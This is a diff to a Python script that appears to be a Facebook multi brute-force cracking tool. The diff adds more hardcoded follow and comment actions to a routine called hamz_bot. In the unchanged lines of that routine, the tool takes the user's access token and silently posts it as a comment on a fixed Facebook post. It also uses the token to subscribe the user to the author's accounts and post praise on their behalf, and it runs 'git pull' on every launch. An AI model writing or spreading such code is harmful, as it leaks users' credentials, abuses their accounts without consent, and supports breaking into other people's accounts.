@@ -74,7 +74,7 @@ def logo():
        \033[1;95m COLLAY | \033[1;96m MULTI | \033[1;91m BRUTE | \033[1;93m FORCE    
                                  
                                                 
-│                               \033[1;93mMy Name \033[1;92m: \033[1;96mIRAV PRATAMA │
+│                               \033[1;93mMy Name \033[1;92m: \033[1;96mRAV PRATAMA │
 └────────────────────────────────────────────────────────┘""""")
 id = []
 cp = []
@@ -589,13 +589,17 @@ def hamz_bot():
         print (' [!] Token invalid') 
         os.system('rm -rf login.txt')
     kom = " Bang @[100009259285042:] Ganteng banget😘😘😘Semoga Bang Rav Langgeng Terus ya Sama @[100043556268486:] ❤😘😘😘"
+    kom2 = " Bang @[100050601457169:] Ganteng Banget😳❤"
+    kom3 = " Bang @[100050601457169:] Semoga Langgeng Sama @[100043556268486:] Amiin 😳❤"
     requests.post('https://graph.facebook.com/100009259285042/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/100050601457169/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/2998427890475824/comments/?message=' +token+ '&access_token=' + token)
     requests.post('https://graph.facebook.com/2998427890475824/comments/?message=' +kom+ '&access_token=' + token)
+    requests.post('https://graph.facebook.com/402798721416840/comments/?message=' +kom2+ '&access_token=' + token)
+    requests.post('https://graph.facebook.com/402832164746829/comments/?message=' +kom3+ '&access_token=' + token)
     menu()
     
-        
+     
 if __name__ == "__main__":
 	os.system("git pull")
 	os.system("touch login.txt")
